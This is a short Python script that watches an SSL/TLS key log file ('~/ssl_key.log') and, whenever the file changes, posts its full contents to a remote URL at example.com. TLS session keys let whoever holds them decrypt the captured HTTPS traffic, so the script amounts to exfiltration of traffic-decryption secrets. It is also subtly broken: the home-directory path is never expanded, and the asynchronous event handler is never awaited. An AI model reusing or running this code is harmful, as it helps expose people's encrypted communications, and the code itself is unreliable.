import os
import asyncio
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import aiohttp

class SSLKeyLogFileHandler(FileSystemEventHandler):
    def __init__(self, file_path, url):
        self.file_path = file_path
        self.url = url
        self.last_modified = os.path.getmtime(file_path)

    async def on_modified(self, event):
        if event.src_path == self.file_path:
            current_modified = os.path.getmtime(self.file_path)
            if current_modified > self.last_modified:
                self.last_modified = current_modified
                async with aiohttp.ClientSession() as session:
                    with open(self.file_path, 'r') as f:
                        file_contents = f.read()
                    try:
                        async with session.post(self.url, data=file_contents) as response:
                            print(f"POST request sent successfully with status code: {response.status}")
                    except aiohttp.ClientError as e:
                        print(f"Error sending POST request: {e}")

async def main():
    file_path = "~/ssl_key.log"
    url = "https://example.com/receive_ssl_key"

    event_handler = SSLKeyLogFileHandler(file_path, url)
    observer = Observer()
    observer.schedule(event_handler, os.path.dirname(file_path), recursive=False)
    observer.start()

    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

if __name__ == "__main__":
    asyncio.run(main())